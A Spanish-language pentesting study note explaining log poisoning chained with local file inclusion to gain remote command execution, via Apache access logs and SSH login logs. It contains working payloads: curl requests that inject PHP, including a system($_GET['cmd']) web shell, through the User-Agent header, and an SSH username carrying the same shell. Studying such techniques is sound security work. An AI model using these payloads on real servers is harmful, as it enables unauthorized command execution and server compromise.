#LogPoisoning #LFI-RCE #OWASP #Explotacion 

#### Descripción
> **Log Poisoning** es una técnica de ataque en la que un atacante **manipula** los **archivos de registro** (**logs**) de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad **LFI** para lograr una **ejecución remota de comandos** en el servidor.

### Abusando de Logs APACHE2
 En el directorio `/var/log` se encuentran los logs de los servicios que estar corriendo y que estos logs sean visibles puede acontecer a un *Log Poisoning* 
 En el servicio de `Apache2` la ruta de los logs se encontraría en `/var/log/apache2/access.log`

Si en el navegador puedes acceder a este archivo nos muestra el `User-Agent` esto es es una parte del protocolo `HTTP` que permite tramitar información de forma detallada sobre el dispositivo que tramita la petición. Con lo que puedes ver la IP que tramita la solicitud y el `User-Agent` que la tramita.

Se puede modificar el `User-Agent` tramitando una petición con CURL y modificando en esta petición el `User-Agent` pudiendo así ejecutar código `PHP`
`curl -s -X GET "http://IP/ruta" -H "User-Agent: <?php system('whoami'); ?>" `

En la consulta anterior con el parámetro `-H` Indicamos cual queremos que sea el `User-Agent` pudiendo así modificarlo para inyectar código `PHP` y que sea interpretado por la maquina victima.

Si podemos colar código `PHP` podemos ver la información y el estado de el `PHP` corriendo en la maquina viendo que funciones están o no habilitadas con la siguiente inyección:
`curl -s -X GET "http://IP/ruta" -H "User-Agent: <?php phpinfo(); ?>" `

Como código `PHP` a colar para poder control total sobre los comandos a inyectar podemos usar la siguiente petición:
`curl -s -X GET "http://IP/ruta" -H "User-Agent: <?php system(\$_GET['cmd']); ?>" `

En la `URL` tendremos que añadir `&cmd=<comando>` y se nos mostrara por pantalla lo que vayamos indicando.

### Abusando de Logs SSH
En el directorio `/var/log` se encuentran los logs de los servicios que estar corriendo y que estos logs sean visibles puede acontecer a un *Log Poisoning* 
En el servicio de `SSH` la ruta de los logs se encontraría en `/var/log/btmp`

En este tipo de *Log Poisoning* el input que se controla es el input del usuario entonces es ahí donde inyectaremos el código `PHP`
`ssh '<?php system($_GET["cmd"]); ?>'@172.17.0.2

En la `URL` tendremos que añadir `&cmd=<comando>` y se nos mostrara por pantalla lo que vayamos indicando.